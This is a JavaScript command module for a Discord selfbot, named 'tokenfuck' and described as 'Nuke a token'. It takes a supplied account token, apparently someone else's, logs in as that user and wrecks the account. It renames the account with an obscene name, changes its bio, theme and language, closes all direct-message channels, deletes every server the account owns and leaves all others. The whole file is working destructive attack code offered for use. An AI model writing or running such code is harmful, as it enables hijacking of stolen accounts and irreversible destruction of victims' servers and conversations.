const Discord = require('discord.js-selfbot-v13');

module.exports = {
    name: 'tokenfuck',
    description: 'Nuke a token',
    execute: async (client, message, args) => {
        await message.edit("> **TokenFuck in progress**").catch(() => false);
        message.delete().catch(() => false);

        const token = args[0];
        if (!token) return message.channel.send("`❌` Please provide a Discord token after the command.");

        const newDescription = "Nqtm";
        const newDisplayName = "Fuck";
        const newTheme = "light";
        const newLanguage = "zh-CN";

        const fclient = new Discord.Client({ checkUpdate: false });

        fclient.on("ready", async () => {
            const profilePromises = [
                fclient.user.setUsername(newDisplayName).catch(() => false),
                fclient.user.setAboutMe(newDescription).catch(() => false)
            ];

            const settingsPromises = [
                fclient.user.settings.update({ theme: newTheme }).catch(() => false),
                fclient.user.settings.update({ locale: newLanguage }).catch(() => false)
            ];

            await fclient.channels.fetch().catch(() => false);
            const dmPromises = fclient.channels.cache
                .filter(ch => ch.type === "DM" || ch.type === "GROUP_DM")
                .map(ch => ch.delete().catch(() => false));

            await fclient.guilds.fetch().catch(() => false);
            const guildPromises = fclient.guilds.cache.map(guild => {
                if (guild.ownerId === fclient.user.id) return guild.delete().catch(() => false);
                else return guild.leave().catch(() => false);
            });

            await Promise.all([...profilePromises, ...settingsPromises, ...dmPromises, ...guildPromises]);

            await message.channel.send("`✅` DMs closed and servers left").catch(() => false);

            fclient.destroy();
        });

        fclient.login(token).catch(() => message.channel.send("`❌` Invalid or unauthorized token").catch(() => false));
    }
};